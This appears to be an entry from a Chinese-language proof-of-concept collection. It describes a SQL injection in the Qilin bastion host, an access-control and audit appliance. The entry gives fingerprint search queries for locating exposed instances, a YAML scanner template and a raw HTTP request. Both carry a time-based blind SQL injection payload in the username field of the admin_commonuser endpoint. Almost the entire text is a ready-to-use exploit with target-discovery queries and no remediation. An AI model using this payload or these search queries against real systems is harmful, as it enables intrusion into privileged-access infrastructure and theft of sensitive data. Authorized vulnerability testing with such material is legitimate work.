## 中远麒麟堡垒机SQL注入
麒麟堡垒机用于运维管理的认证、授权、审计等监控管理。中远麒麟堡垒机存在SQL注入，可利用该漏洞获取系统敏感信息。


## 检索条件：

cert="Baolei" 或 title="麒麟堡垒机" 或 body="admin.php?controller=admin_index&action=get_user_login_fristauth" 

或 body="admin.php?controller=admin_index&action=login"
```
poc:
  relative: req0 && req1
  session: false
  requests:
  - method: POST
    timeout: 10
    path: /admin.php?controller=admin_commonuser
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.2786.81 Safari/537.36
    data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
    follow_redirects: true
    matches: (code.eq("200") && time.gt("5") && time.lt("10"))
  - method: POST
    timeout: 10
    path: /admin.php?controller=admin_commonuser
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.2786.81 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
    data: username=admin
    follow_redirects: true
    matches: time.lt("5")

```


## 请求包
```
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 78
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
```
